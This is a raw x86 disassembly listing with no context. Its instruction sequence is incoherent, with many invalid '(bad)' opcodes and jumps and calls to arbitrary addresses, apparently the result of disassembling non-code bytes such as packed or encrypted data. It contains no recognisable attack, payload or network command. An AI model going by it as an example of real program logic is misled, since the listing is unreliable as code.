  413cb1:	cmp    eax,0x3dfad73b
  413cb6:	sub    eax,0xe7a15008
  413cbb:	jb     0x413d1d
  413cbd:	pop    esi
  413cbe:	sti    
  413cbf:	jo     0x9436d888
  413cc5:	sub    ah,BYTE PTR [eax+0x3e535d96]
  413ccb:	push   ebp
  413ccc:	(bad)  [esi-0x6c]
  413ccf:	xchg   esi,eax
  413cd0:	int    0x56
  413cd2:	ja     0x413cb0
  413cd4:	loopne 0x413cfc
  413cd6:	xchg   esi,eax
  413cd7:	and    eax,0xd1b09077
  413cdc:	arpl   WORD PTR [edx],bx
  413cde:	daa    
  413cdf:	xchg   ebx,eax
  413ce0:	int3   
  413ce1:	inc    ebx
  413ce2:	inc    esi
  413ce3:	cmp    al,0x81
  413ce5:	dec    edi
  413ce6:	rcl    dh,cl
  413ce8:	mov    al,0x83
  413cea:	xor    DWORD PTR [ebx-0x3b5e93c4],ebp
  413cf0:	popf   
  413cf1:	hlt    
  413cf2:	xchg   edx,eax
  413cf3:	test   BYTE PTR [eax],ah
  413cf5:	rcl    BYTE PTR [eax],1
  413cf7:	xor    bl,bh
  413cf9:	pusha  
  413cfa:	test   ebx,edx
  413cfc:	jne    0x413d2d
  413cfe:	or     bh,BYTE PTR [esi+0x56240a58]
  413d04:	push   0x1b
  413d06:	mov    ds:0xafd3583,eax
  413d0b:	retf   0x3dac
  413d0e:	jb     0x413d8e
  413d10:	mov    al,0xe4
  413d12:	pop    esp
  413d13:	popf   
  413d14:	push   0x807cc51b
  413d19:	pop    esi
  413d1a:	ret    
  413d1b:	rcr    BYTE PTR [ecx+0x5d],cl
  413d1e:	mov    ecx,0xd5704163
  413d23:	js     0x413cef
  413d25:	mov    edx,fs
  413d27:	loop   0x413d9e
  413d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d2a:	and    bl,dl
  413d2c:	lea    ecx,[ebx-0x23a23eb3]
  413d32:	nop
  413d33:	jns    0x413d77
  413d35:	inc    ebx
  413d36:	test   BYTE PTR [ebx-0x43],al
  413d39:	loope  0x413d64
  413d3b:	sbb    bh,cl
  413d3d:	sub    DWORD PTR [ebx+0x71],eax
  413d40:	ins    DWORD PTR es:[edi],dx
  413d41:	add    eax,0xd4102705
  413d46:	retf   0xa182
  413d49:	fs and al,0x46
  413d4c:	pop    ds
  413d4d:	add    DWORD PTR [ebp+edi*8+0x7fa7e825],0x2185b233
  413d58:	mov    ?,edx
  413d5a:	call   0x928c:0xd195af61
  413d61:	pop    es
  413d62:	jmp    0x413d00
  413d64:	mov    ch,0x5
  413d66:	sbb    BYTE PTR [edx],0xaf
  413d69:	pushf  
  413d6a:	push   edx
  413d6b:	stc    
  413d6c:	sub    al,0xc1
  413d6e:	leave  
  413d6f:	sbb    al,0xbd
  413d71:	ror    BYTE PTR [ebx],0x18
  413d74:	and    edx,0xffffff8f
  413d77:	dec    ecx
  413d78:	add    ebx,DWORD PTR [esi+0x3cbc8ded]
  413d7e:	int    0x18
  413d80:	mov    edx,0x5cf84bc3
  413d85:	int    0x7d
  413d87:	(bad)  
  413d88:	arpl   WORD PTR [eax],ax
  413d8a:	xchg   edx,eax
  413d8b:	inc    dl
  413d8d:	mov    ecx,0x5487df8c
  413d92:	sahf   
  413d93:	mov    bl,0xcb
  413d95:	outs   dx,BYTE PTR ds:[esi]
  413d96:	ins    DWORD PTR es:[edi],dx
  413d97:	mov    al,0xa1
  413d99:	inc    esp
  413d9a:	lods   eax,DWORD PTR ds:[esi]
  413d9b:	rcl    BYTE PTR [eax+ebx*8-0x2a],0xc0
  413da0:	mov    ecx,0xe56d0e68
  413da5:	je     0x413dd4
  413da7:	fadd   st(3),st
  413da9:	add    al,0x3e
  413dac:	aad    0xd8
  413dae:	xchg   ecx,eax
  413daf:	repnz xchg ebp,eax
  413db1:	dec    ecx
  413db2:	adc    ah,BYTE PTR [ecx]
  413db4:	xlat   BYTE PTR ds:[ebx]
  413db5:	push   cs
  413db6:	sbb    ecx,DWORD PTR [eax-0x19]
  413db9:	inc    edx
  413dba:	mov    ah,0x5c
  413dbc:	sub    eax,0x14221fa3
  413dc1:	enter  0x677e,0x83
  413dc5:	sbb    BYTE PTR [ebx-0x4f],dh
  413dc8:	cmp    BYTE PTR [ebx+0x57],0x83
  413dcc:	xlat   BYTE PTR ds:[ebx]
  413dcd:	mov    edx,0x995e214
  413dd2:	fisubr WORD PTR [edx-0x6618b8f2]
  413dd8:	pop    ds
  413dd9:	sbb    edi,esp
  413ddb:	adc    al,0x1d
  413ddd:	sub    ebp,0xb0570d69
  413de3:	repnz lods al,BYTE PTR ds:[esi]
  413de5:	bnd jge 0x413e02
  413de8:	out    dx,eax
  413de9:	mov    ebx,0x6a50b0ab
  413dee:	or     BYTE PTR [esi-0x6b],dl
  413df1:	adc    eax,0x3108ee13
  413df6:	mov    eax,ds:0xf5fb0b63
  413dfb:	test   eax,0x35bca106
  413e00:	mov    ah,0x59
  413e02:	and    eax,DWORD PTR [ebp-0x54]
  413e05:	pop    ebp
  413e06:	jecxz  0x413db4
  413e08:	push   esi
  413e09:	mov    WORD PTR [edx+0x62ffdffe],gs
  413e0f:	add    eax,0x93cbad6
  413e14:	ins    BYTE PTR es:[edi],dx
  413e15:	sub    DWORD PTR [ebp+ebp*1-0x4a],esi
  413e19:	and    edx,DWORD PTR [ecx+0x15]
  413e1c:	out    0x5,al
  413e1e:	rcr    DWORD PTR [eax+0x2c],0x15
  413e22:	mov    DWORD PTR [edx+0x25],0xd7817a5d
  413e29:	xchg   ebp,eax
  413e2a:	pop    ss
  413e2b:	fstp   DWORD PTR [eax]
  413e2d:	dec    esi
  413e2e:	sbb    al,0x5a
  413e30:	xor    BYTE PTR [ebp-0x37],dl
  413e33:	mov    ebp,0x290e7485
  413e38:	sbb    ecx,edi
  413e3a:	or     esp,edi
  413e3c:	rol    BYTE PTR [edx],0x15
  413e3f:	pop    ecx
  413e40:	xchg   ebx,eax
  413e41:	pop    es
  413e42:	jmp    0x4f45bb92
  413e47:	call   0x1a408a6c
  413e4c:	sahf   
  413e4d:	or     BYTE PTR [ecx],bh
  413e4f:	push   DWORD PTR [edx]
  413e51:	push   es
  413e52:	out    0xa9,eax
  413e54:	xlat   BYTE PTR ds:[ebx]
  413e55:	xchg   BYTE PTR [eax+0x17],dh
  413e58:	mov    bh,0x32
  413e5a:	push   eax
  413e5b:	mov    eax,0x7ded4e4e
  413e60:	pushf  
  413e61:	pop    ds
  413e62:	imul   esp,DWORD PTR [ecx+0x1d6ca3c7],0x16
  413e69:	rcl    BYTE PTR [edi+ecx*1-0x25],0x87
  413e6e:	into   
  413e6f:	sub    BYTE PTR [ecx-0x4981ee9],bl
  413e75:	out    dx,al
  413e76:	push   eax
  413e77:	mov    al,ds:0x9395094d
  413e7c:	xchg   esp,eax
  413e7d:	mov    WORD PTR ds:0xa4674607,fs
  413e83:	call   0x4e4:0x50e994af
  413e8a:	mov    dl,0xb8
  413e8c:	mov    cl,0xc4
  413e8e:	mov    ch,0xea
  413e90:	fdivr  DWORD PTR ds:0x93a1c2be
  413e96:	cld    
  413e97:	leave  
  413e98:	inc    ecx
  413e99:	pop    ebp
  413e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e9b:	mov    edi,0xe66fc8a2
  413ea0:	imul   edi,ebx
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	ins    BYTE PTR es:[edi],dx
  413eb8:	or     esp,DWORD PTR [ebx]
  413eba:	in     eax,0xef
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	repnz ins DWORD PTR es:[edi],dx
  413ec5:	mov    eax,0xafb4309f
  413eca:	mov    esp,0xcd992e0f
  413ecf:	jae    0x413f32
  413ed1:	pop    esp
  413ed2:	mov    ebx,DWORD PTR [edx+0x37]
  413ed5:	and    al,0xb7
  413ed7:	iret   
  413ed8:	mov    bl,0x72
  413eda:	jo     0x413ed0
  413edc:	mov    bh,0xa2
  413ede:	sbb    WORD PTR [ebx+0x54],0xeea7
  413ee4:	push   es
  413ee5:	int    0x16
  413ee7:	and    al,ah
  413ee9:	inc    esi
  413eea:	and    DWORD PTR [eax-0x3c60d419],0x29
  413ef1:	push   ecx
  413ef2:	sbb    eax,0x3703e1ad
  413ef7:	xor    BYTE PTR [ebx+0x2a0612a9],ah
  413efd:	pop    eax
  413efe:	jmp    0x1efa:0x53a609b
  413f05:	stos   DWORD PTR es:[edi],eax
  413f06:	add    edx,edx
  413f08:	sti    
  413f09:	xor    dh,bl
  413f0b:	add    al,0x63
  413f0d:	mov    al,BYTE PTR ds:0xe0a3beeb
  413f13:	add    dh,BYTE PTR [edx-0x6e390a97]
  413f19:	in     eax,dx
  413f1a:	lahf   
  413f1b:	jle    0x413f21
  413f1d:	pop    edi
  413f1e:	jmp    0xf6542b45
  413f23:	outs   dx,BYTE PTR ds:[esi]
  413f24:	pop    edi
  413f25:	ret    0x6ec8
  413f28:	and    eax,0x79303b9d
  413f2d:	(bad)  
  413f2e:	mov    ds:0x910e6d0b,eax
  413f33:	push   ecx
  413f34:	ss loopne 0x413ed3
  413f37:	mov    ebx,DWORD PTR [ecx-0x24]
  413f3a:	inc    ebp
  413f3b:	sbb    DWORD PTR [ecx+edi*4+0x3d87236],ecx
  413f42:	or     dh,BYTE PTR [ecx]
  413f44:	(bad)  
  413f45:	xchg   edx,eax
  413f46:	jnp    0x413f0d
  413f48:	rol    DWORD PTR [ebx],0xfb
  413f4b:	push   esp
  413f4c:	lods   al,BYTE PTR ds:[esi]
  413f4d:	in     al,dx
  413f4e:	in     al,dx
  413f4f:	call   0x8affae6e
  413f54:	repz pop ebp
  413f56:	push   esi
  413f57:	sbb    al,0x69
  413f59:	push   cs
  413f5a:	loopne 0x413fda
  413f5c:	push   0x1b
  413f5e:	pop    ebx
  413f5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f61:	lea    esp,ds:0x8a38a373
  413f67:	psraw  mm1,mm5
  413f6a:	pushf  
  413f6b:	jno    0x413f5c
  413f6d:	xchg   ebx,eax
  413f6e:	lahf   
  413f6f:	pusha  
  413f70:	push   ebp
  413f71:	xor    DWORD PTR [edi],esi
  413f73:	cmp    DWORD PTR [ebx+0x4d502777],ebp
  413f79:	(bad)  
  413f7a:	or     cl,dl
  413f7c:	xchg   edi,eax
  413f7d:	inc    ebx
  413f7e:	push   ds
  413f7f:	(bad)  
  413f80:	pop    ss
  413f81:	pop    edx
  413f82:	mov    esp,0x7a105629
  413f87:	icebp  
  413f88:	retf   0x444f
  413f8b:	ror    edi,0x57
  413f8e:	and    cl,BYTE PTR [eax]
  413f90:	stc    
  413f91:	std    
  413f92:	or     DWORD PTR [esi+ebx*2-0x46],0x20
  413f97:	test   DWORD PTR [esi-0x7ddc2120],ebp
  413f9d:	and    ebx,DWORD PTR [esi-0x9]
  413fa0:	std    
  413fa1:	or     ah,dh
  413fa3:	pop    ecx
  413fa4:	push   ds
  413fa5:	in     al,dx
  413fa6:	enter  0xb0c6,0x73
  413faa:	dec    ecx
  413fab:	cdq    
  413fac:	lea    ebx,[esi+0x5113e3a8]
  413fb2:	pop    esi
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	mov    dh,0x7b
  413fb6:	adc    edx,DWORD PTR [eax]
  413fb8:	jo     0x413f86
  413fba:	and    DWORD PTR [ebx],ebx
  413fbc:	imul   esi,DWORD PTR [ecx],0x66f69d59
  413fc2:	xchg   ebp,eax
  413fc3:	ret    0x68dd
  413fc6:	xlat   BYTE PTR ds:[ebx]
  413fc7:	(bad)  
  413fc9:	ds into 
  413fcb:	jo     0x413f70
  413fcd:	les    eax,FWORD PTR ds:0x1336552d
  413fd3:	sbb    DWORD PTR [eax+0x3e],esp
  413fd6:	mov    DWORD PTR [ebx+esi*8-0x34],esp
  413fda:	sbb    BYTE PTR [ebx+0x5b6c8f1],0xd7
  413fe1:	xchg   esi,eax
  413fe2:	rcl    DWORD PTR [ebx+0x54fbb53a],1
  413fe8:	(bad)  
  413fe9:	jmp    0x413f75
  413feb:	cld    
  413fec:	test   eax,0xf95026ba
  413ff1:	mov    bh,0xe3
  413ff3:	mov    ah,0xf
  413ff5:	pop    ecx
  413ff6:	sub    ah,BYTE PTR [ebx+0x0]
  413ff9:	lods   al,BYTE PTR ds:[esi]
  413ffa:	sahf   
  413ffb:	outs   dx,DWORD PTR ds:[esi]
  413ffc:	pop    esi
  413ffd:	inc    eax
  413ffe:	jp     0x414054
  414000:	or     BYTE PTR [ebx+0x39f36b1a],dh
  414006:	lods   al,BYTE PTR ds:[esi]
  414007:	push   esi
  414008:	sbb    esi,ebx
  41400a:	pushf  
  41400b:	add    eax,0xde619c0f
  414010:	xchg   edi,eax
  414011:	std    
  414012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414013:	xchg   edi,eax
  414014:	or     esi,DWORD PTR [esi+ecx*8]
  414017:	(bad)  
  414018:	out    0xf,eax
  41401a:	js     0x414008
  41401c:	repz xor DWORD PTR [edi-0x39],ebp
  414020:	enter  0x3a2f,0x2a
  414024:	pop    edx
  414025:	or     DWORD PTR [ebx],eax
  414027:	cli    
  414028:	cld    
  414029:	jp     0x414060
  41402b:	out    dx,eax
  41402c:	loop   0x41400c
  41402e:	fwait
  41402f:	inc    ecx
  414030:	jne    0x41407e
  414032:	in     eax,dx
  414033:	or     dh,BYTE PTR [edi+0x6b47d0e2]
  414039:	push   0xffffffcc
  41403b:	xor    esp,DWORD PTR [ecx]
  41403d:	jg     0x413fbf
  41403f:	xor    BYTE PTR [ebx+0x71],bh
  414042:	sahf   
  414043:	inc    edi
  414044:	add    DWORD PTR ds:0x37b1e1a1,edi
  41404a:	sbb    DWORD PTR [ecx],edx
  41404c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41404d:	imul   ebp,DWORD PTR [ecx+0x2d701313],0x3392a2c3
  414057:	jbe    0x413fdf
  414059:	or     eax,0xdf104b09
  41405e:	and    cl,dh
  414060:	dec    ebp
  414061:	sbb    al,0xa8
  414063:	jne    0x414054
  414065:	retf   
  414066:	and    bh,BYTE PTR [eax-0x3b]
  414069:	ins    DWORD PTR es:[edi],dx
  41406a:	repz sub al,0x4c
  41406d:	inc    esp
  41406e:	xchg   edx,eax
  41406f:	js     0x4140df
  414071:	sbb    dl,dh
  414073:	in     al,0xe3
  414075:	add    eax,0xf70e47b7
  41407a:	mov    ebp,0x1b97ffc0
  41407f:	aad    0x99
  414081:	mov    esp,0xcf3889bc
  414086:	adc    BYTE PTR [edx+0x2f29a665],0x54
  41408d:	(bad)  
  41408e:	fistp  WORD PTR [ecx]
  414090:	and    DWORD PTR [eax-0x25],edx
  414093:	inc    edx
  414094:	iret   
  414095:	xchg   esp,eax
  414096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414097:	cmp    DWORD PTR [ebp-0xb],ebp
  41409a:	xchg   esp,eax
  41409b:	push   ecx
  41409c:	call   ebx
  41409e:	(bad)  
  4140a0:	add    BYTE PTR [ebp+eiz*2-0xe],bh
  4140a4:	sbb    ch,BYTE PTR [ebx-0x5f]
  4140a7:	push   cs
  4140a8:	xchg   esi,eax
  4140a9:	popa   
  4140aa:	push   edi
  4140ab:	arpl   si,bx
  4140ad:	sbb    bh,BYTE PTR [eax]
  4140af:	sub    ebx,eax
  4140b1:	jb     0x414080
  4140b3:	popa   
  4140b4:	cmp    BYTE PTR [edx],dh
  4140b6:	hlt    
  4140b7:	pop    ss
  4140b8:	(bad)  [edi]
  4140ba:	in     al,dx
  4140bb:	not    ch
  4140bd:	push   edx
  4140be:	or     ecx,esp
  4140c0:	dec    eax
  4140c1:	int    0xe
  4140c3:	and    ebx,esp
  4140c5:	lea    eax,[eax-0x20c6f0f0]
  4140cb:	jmp    0x717e:0x90716355
  4140d2:	dec    ebp
  4140d3:	cmp    eax,0xcf9a3b80
  4140d8:	out    0x57,al
  4140da:	in     al,dx
  4140db:	call   0x100c75ba
  4140e0:	stos   BYTE PTR es:[edi],al
  4140e1:	repz out dx,al
  4140e3:	sbb    bl,BYTE PTR [ebx]
  4140e5:	jb     0x4140fe
  4140e7:	mov    esi,0xc1150655
  4140ec:	mov    ecx,0x779c315f
  4140f1:	das    
  4140f2:	(bad)  
  4140f3:	into   
  4140f4:	ins    DWORD PTR es:[edi],dx
  4140f5:	inc    eax
  4140f6:	mul    ch
  4140f8:	sahf   
  4140f9:	push   ecx
  4140fa:	fld    QWORD PTR [eax-0x53e20b5]
  414100:	inc    ebp
  414101:	sub    al,BYTE PTR [esi-0x245583ef]
  414107:	retf   0xa8c6
  41410a:	or     DWORD PTR [edx-0x2b66588e],edi
  414110:	arpl   WORD PTR [edi+0x6a6150f6],sp
  414116:	div    ch
  414118:	test   eax,0x15041e5d
  41411d:	jp     0x414131
  41411f:	mov    cl,0x3c
  414121:	xor    bh,bh
  414123:	test   al,0x7e
  414125:	xchg   edx,eax
  414126:	xchg   ebx,eax
  414127:	js     0x41412f
  414129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41412a:	fdivr  QWORD PTR [edx+0x65]
  41412d:	or     al,0x33
  41412f:	fsubr  st,st(1)
  414131:	add    DWORD PTR [edx],0x0
  414134:	add    ah,al
  414136:	aas    
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0x5b145a14
  414142:	adc    ah,dl
  414144:	sub    DWORD PTR [esp+eax*1+0x7f],edx
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x4140e7
  41414e:	mov    DWORD PTR [edx+0x3a],ebp
  414151:	lea    eax,[edi-0x78bde1fe]
  414157:	call   0x71a91180
  41415c:	aaa    
  41415d:	xlat   BYTE PTR ds:[ebx]
  41415e:	int    0xd8
  414160:	or     edx,ecx
  414162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414163:	lahf   
  414164:	cmp    eax,0xb8e5b466
  414169:	in     eax,dx
  41416a:	push   esi
  41416b:	or     al,0x44
  41416d:	inc    edx
  41416e:	stc    
  41416f:	mov    bl,0xcd
  414171:	loopne 0x4141d4
  414173:	dec    ebp
  414174:	pusha  
  414175:	pop    ecx
  414176:	inc    esp
  414177:	sub    al,0xd3
  414179:	jb     0x414161
  41417b:	mov    esp,0xf449ac86
  414180:	fisttp WORD PTR [edx]
  414182:	int3   
  414183:	pop    edi
  414184:	lock adc ecx,DWORD PTR [ebx]
  414187:	sub    ebp,esi
  414189:	mov    al,ds:0xf8701ec3
  41418e:	adc    dl,ah
  414190:	dec    edi
  414191:	lods   eax,DWORD PTR ds:[esi]
  414192:	or     DWORD PTR [edx],edx
  414194:	cmp    ah,bh
  414196:	dec    ebx
  414197:	retf   0xeae9
  41419a:	hlt    
  41419b:	sbb    dl,bh
  41419d:	inc    eax
  41419e:	ss pop edx
  4141a0:	or     al,0xce
  4141a2:	mov    ds:0x7b62b9f0,eax
  4141a7:	pop    ecx
  4141a8:	ins    DWORD PTR es:[edi],dx
  4141a9:	mov    BYTE PTR [esi+0x21],dh
  4141ac:	xchg   BYTE PTR [eiz*2+0x62b7bc41],ah
  4141b3:	loope  0x41418d
  4141b5:	fisubr DWORD PTR [ebx+0x62]
  4141b8:	imul   ebx,DWORD PTR [edi-0x5a],0x47
  4141bc:	fisttp QWORD PTR [ebp+0x2c26b4ff]
  4141c2:	sbb    ebp,DWORD PTR [eax]
  4141c4:	add    al,0x99
  4141c6:	pop    esi
  4141c7:	and    eax,0x5d718f6e
  4141cc:	inc    eax
  4141cd:	fs push ds
  4141cf:	popf   
  4141d0:	clc    
  4141d1:	xor    DWORD PTR [ebx],edi
  4141d3:	fimul  DWORD PTR [ebp-0x2c6b0d39]
  4141d9:	mov    ah,0xfc
  4141db:	popf   
  4141dc:	pop    esi
  4141dd:	push   ebp
  4141de:	mov    ebp,0x3884c566
  4141e3:	jp     0x41423d
  4141e5:	inc    eax
  4141e6:	or     cl,BYTE PTR [edi]
  4141e8:	ja     0x4141dc
  4141ea:	jp     0x41423d
  4141ec:	push   ebp
  4141ed:	mov    bh,bh
  4141ef:	xchg   ebx,eax
  4141f0:	mov    BYTE PTR [eax+0x5b982193],bh
  4141f6:	int3   
  4141f7:	lock and DWORD PTR [edx+0x66],0x711ed24a
  4141ff:	arpl   bx,bx
  414201:	inc    ecx
  414202:	jns    0x414206
  414204:	push   esp
  414205:	fdivr  DWORD PTR [esi]
  414207:	push   eax
  414208:	cs dec edx
  41420a:	stos   BYTE PTR es:[edi],al
  41420b:	pop    eax
  41420c:	push   edi
  41420d:	mov    bh,0x87
  41420f:	dec    esp
  414210:	xlat   BYTE PTR ds:[ebx]
  414211:	int3   
  414212:	test   ecx,ebx
  414214:	add    edx,edx
  414216:	mov    al,ds:0xd58a73ed
  41421b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41421c:	and    BYTE PTR [edx-0x58],ch
  41421f:	mov    bl,BYTE PTR [esi]
  414221:	jle    0x41425f
  414223:	mov    eax,ds:0x54a4e244
  414228:	sub    ecx,DWORD PTR [ebx+0x2742d66]
  41422e:	test   DWORD PTR ds:0xd51a539,edi
  414234:	mov    DWORD PTR [ebx+0x0],edx
  414237:	mov    ah,BYTE PTR [ecx-0x4c]
  41423a:	mov    fs,WORD PTR [eax-0x71d4ecf4]
  414240:	xchg   ebp,eax
  414241:	dec    edx
  414242:	(bad)  
  414243:	jns    0x414252
  414245:	data16 sub BYTE PTR [ebx+esi*8],0x22
  41424a:	aaa    
  41424b:	xor    edx,DWORD PTR [ebx-0x47e81890]
  414251:	sbb    BYTE PTR [edx+ebp*2],al
  414254:	mov    esi,0xe74ab146
  414259:	stos   DWORD PTR es:[edi],eax
  41425a:	jae    0x41420f
  41425c:	adc    al,0x96
  41425e:	push   ss
  41425f:	cdq    
  414260:	push   edi
  414261:	sub    ebx,DWORD PTR es:[eax+0x7a618d8b]
  414268:	in     eax,0x65
  41426a:	add    eax,0x25e4e0cc
  41426f:	sbb    dh,BYTE PTR [eax]
  414271:	rol    BYTE PTR [ebx+0x6c],0xa3
  414275:	mov    ds:0xe9117d15,eax
  41427a:	push   ecx
  41427b:	dec    ecx
  41427c:	aad    0x75
  41427e:	pop    ds
  41427f:	adc    DWORD PTR [ebx+0x49],0xfffffff6
  414283:	mov    eax,ds:0x2c36d254
  414288:	leave  
  414289:	pop    ds
  41428a:	pop    eax
  41428b:	push   ss
  41428c:	out    dx,eax
  41428d:	xlat   BYTE PTR ds:[ebx]
  41428e:	das    
  41428f:	cmp    eax,0xe655011d
  414294:	xor    esp,eax
  414296:	mov    ah,0xeb
  414298:	retf   0x15a5
  41429b:	add    cl,BYTE PTR [ecx]
  41429d:	pop    ss
  41429e:	outs   dx,BYTE PTR ds:[esi]
  41429f:	test   al,0x90
  4142a1:	sbb    eax,0x5bad9a47
  4142a6:	mov    bl,0x10
  4142a8:	inc    edi
  4142a9:	cmp    bh,BYTE PTR [eax-0x73]
  4142ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142ad:	sub    DWORD PTR [ecx-0xe7d1552],ebx
  4142b3:	jbe    0x41425f
  4142b5:	jnp    0x41423f
  4142b7:	jae    0x414278
  4142b9:	jno    0x414326
  4142bb:	test   DWORD PTR [edx],edx
  4142bd:	nop
  4142be:	(bad)
  4142c2:	sbb    DWORD PTR [edi],0xfddd4668
  4142c8:	xchg   esi,eax
  4142c9:	pop    eax
  4142ca:	test   eax,0x368b8fa6
  4142cf:	(bad)  
  4142d1:	pop    edi
  4142d2:	int    0xca
  4142d4:	cs jp  0x414261
  4142d7:	call   0x17a6:0xaf5aebaf
  4142de:	pop    ds
  4142df:	sbb    ebp,DWORD PTR [ecx]
  4142e1:	dec    edi
  4142e2:	cmp    BYTE PTR [esi+0x5b],ch
  4142e5:	test   DWORD PTR [ebp+edi*1+0x36],esp
  4142e9:	jge    0x4142d9
  4142eb:	sub    al,0x50
  4142ed:	std    
  4142ee:	dec    ebx
  4142ef:	mov    eax,0xe6fe000
  4142f4:	xchg   DWORD PTR [ecx+0x29],edi
  4142f7:	pop    edi
  4142f8:	jl     0x414329
  4142fa:	sub    eax,0x109fbf43
  4142ff:	xor    al,0x1c
  414301:	lods   al,BYTE PTR ds:[esi]
  414302:	pop    ecx
  414303:	cmp    al,0x41
  414305:	loop   0x41430a
  414307:	cld    
  414308:	sbb    esi,edi
  41430a:	pmaxsw mm4,QWORD PTR [esi]
  41430d:	add    BYTE PTR [edx+0x2b405bb1],0x78
  414314:	neg    DWORD PTR [esi]
  414316:	jg     0x414386
  414318:	scas   al,BYTE PTR es:[edi]
  414319:	inc    ebp
  41431a:	mov    al,0xbb
  41431c:	test   eax,0xab6c61df
  414321:	push   ss
  414322:	add    DWORD PTR [ecx+0x61],esp
  414325:	pop    ds
  414326:	mov    ds:0x9827a4a,eax
  41432b:	inc    edi
  41432c:	mul    BYTE PTR [edi+ebx*4+0x25d832dd]
  414333:	mov    BYTE PTR [edx-0x48],al
  414336:	pusha  
  414337:	pop    es
  414338:	jne    0x414357
  41433a:	pop    es
  41433b:	enter  0x613,0xd4
  41433f:	xchg   DWORD PTR [edi-0x2d6de23],edx
  414345:	inc    ebx
  414346:	stc    
  414347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414348:	nop
  414349:	or     eax,0xf28bef5f
  41434e:	lock xchg esi,eax
  414350:	je     0x41437b
  414352:	stos   DWORD PTR es:[edi],eax
  414353:	int3   
  414354:	mov    DWORD PTR [ecx-0x7d],ebp
  414357:	out    0xf6,al
  414359:	and    ebx,esp
  41435b:	lds    esp,FWORD PTR [edx]
  41435d:	scas   eax,DWORD PTR es:[edi]
  41435e:	ret    
  41435f:	gs jmp 0x5b00:0xdd47bd0f
  414367:	xor    DWORD PTR [ebx],esp
  414369:	mov    bl,0x54
  41436b:	jmp    0x414302
  41436d:	mov    DWORD PTR [edx-0x58],ebx
  414370:	push   esi
  414371:	je     0x4143cb
  414373:	inc    ebx
  414374:	xor    al,0x7a
  414376:	pop    esi
  414377:	in     eax,0xb2
  414379:	mov    bl,0xd7
  41437b:	jp     0x41430c
  41437d:	pop    eax
  41437e:	mov    cl,0x2c
  414380:	mov    dl,0x87
  414382:	aad    0x65
  414384:	dec    ebx
  414385:	pop    ss
  414386:	(bad)  
  414387:	cmp    al,0x4d
  414389:	pop    eax
  41438a:	jp     0x414358
  41438c:	and    BYTE PTR [esi+0x50],bh
  41438f:	aad    0x8f
  414391:	mov    bh,0xfc
  414393:	in     eax,dx
  414394:	cmp    DWORD PTR es:[esi],eax
  414397:	call   0x5103:0xebaef04e
  41439e:	dec    ecx
  41439f:	lahf   
  4143a0:	sub    BYTE PTR [eax+0x1],0x3b
  4143a4:	enter  0x2c3b,0xd7
  4143a8:	mov    BYTE PTR [ecx-0x8f8d7b1],0xfb
  4143af:	jge    0x414362
  4143b1:	or     bh,BYTE PTR [ecx]
  4143b3:	push   cs
  4143b4:	push   0x4
  4143b6:	push   esp
  4143b7:	jns    0x4143e4
  4143b9:	ror    DWORD PTR [ebp+0x72981fbc],1
  4143bf:	xor    al,BYTE PTR [eax]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	pop    ds
  4143e5:	pop    esp
  4143e6:	mov    ch,bl
  4143e8:	ror    DWORD PTR [ecx],0x7f
  4143eb:	js     0x4143d2
  4143ed:	jle    0x414467
  4143ef:	js     0x4143b9
  4143f1:	arpl   WORD PTR [ebx+0x6a30403d],ax
  4143f7:	mov    BYTE PTR ds:0x6f687d1c,dl
  4143fd:	sub    BYTE PTR [ecx+0xb],bl
  414400:	test   ebp,ecx
  414402:	add    dl,BYTE PTR [edx]
  414404:	addr16 push ebp
  414406:	ins    DWORD PTR es:[edi],dx
  414407:	rcr    esi,cl
  414409:	mov    esi,DWORD PTR [ebp-0x2b]
  41440c:	add    esi,esi
  41440e:	xor    BYTE PTR ds:0x57d537bc,0x27
  414415:	xchg   BYTE PTR [ebx],dl
  414417:	ins    BYTE PTR es:[edi],dx
  414418:	cmp    edx,DWORD PTR [ecx+0x5f]
  41441b:	add    edx,edi
  41441d:	enter  0x5b76,0x58
  414421:	cli    
  414422:	mov    ebx,0x1c1e4a1f
  414427:	aas    
  414428:	add    esp,DWORD PTR [edx-0x55]
  41442b:	push   cs
  41442c:	mov    eax,0x302e2946
  414431:	xchg   edi,eax
  414432:	push   ss
  414433:	cmp    ebx,DWORD PTR ds:0x21200f10
  414439:	sub    BYTE PTR [esi+0x4ffc2c6b],bh
  41443f:	aad    0xdb
  414441:	or     edx,DWORD PTR ds:0xd4833e4d
  414447:	xchg   DWORD PTR [ebx-0x2c],eax
  41444a:	cs jg  0x4144bb
  41444d:	std    
  41444e:	rol    DWORD PTR [ebx-0x48ac3c2e],1
  414454:	nop
  414455:	mov    ah,0xd5
  414457:	sbb    esi,0xb0fe4dae
  41445d:	int    0x10
  41445f:	(bad)  
